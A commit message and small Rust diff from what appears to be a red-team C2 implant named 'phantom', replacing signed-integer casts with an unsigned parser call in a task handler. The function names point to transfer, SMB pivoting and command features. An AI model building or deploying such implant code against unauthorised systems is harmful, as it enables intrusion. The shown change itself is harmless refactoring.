chore(phantom): replace int32()? as u32 cast sites with uint32()?
Replace 7 call sites across network.rs (execute_transfer Stop/Resume/Remove),
mod.rs (execute_drop_buffers dropped_length/max_length), and pivot.rs
(execute_pivot SmbDisconnect/SmbCommand). No semantic change — uint32()
reads the same bytes as int32()? as u32 but removes the need for readers
to verify the cast is intentional on every occurrence.

Closes: red-cell-c2-1mz3r

+++ agent/phantom/src/command/mod.rs
@@ -198,8 +198,8 @@ fn execute_package_dropped(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let dropped_length = parser.int32()? as u32;
-    let max_length = parser.int32()? as u32;
+    let dropped_length = parser.uint32()?;
+    let max_length = parser.uint32()?;
 
     tracing::warn!(
         request_id,
